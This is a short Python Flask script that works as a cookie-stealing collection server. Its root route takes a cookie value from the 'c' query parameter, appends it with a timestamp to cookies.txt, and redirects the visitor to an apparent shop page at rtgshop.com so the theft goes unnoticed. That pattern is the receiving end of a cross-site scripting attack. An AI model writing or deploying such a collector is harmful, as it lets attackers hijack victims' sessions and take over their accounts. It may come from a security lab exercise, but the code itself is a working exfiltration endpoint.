from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    cookie = request.args.get('c')
    print(cookie)
    f = open("cookies.txt", "a")
    f.write(cookie+ ''+ str(datetime.now())+ '\n')
    f.close()

    return redirect("http://rtgshop.com/shop.html")


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5001)
